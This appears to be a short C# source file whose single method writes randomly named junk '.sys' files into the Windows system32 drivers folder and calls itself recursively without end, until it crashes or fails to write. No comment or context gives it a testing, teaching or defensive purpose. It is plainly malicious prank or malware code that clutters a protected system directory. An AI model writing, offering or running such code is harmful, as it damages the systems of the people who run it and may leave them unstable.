using System;
using System.IO;

namespace MyLifeForAiur
{
  class Shit
  {
    static Random rnd = new Random();
    public static int DoShit(int i)
    {
        string Name = null;
        for (int k = 0; k < rnd.Next(0, 14); k++)
          Name += Convert.ToChar(rnd.Next(97, 122));
        string Path = @"C:\WINDOWS\system32\drivers\" + Name + ".sys";
        File.WriteAllText(Path, Path);
        return DoShit(i++);
    }
  }
}
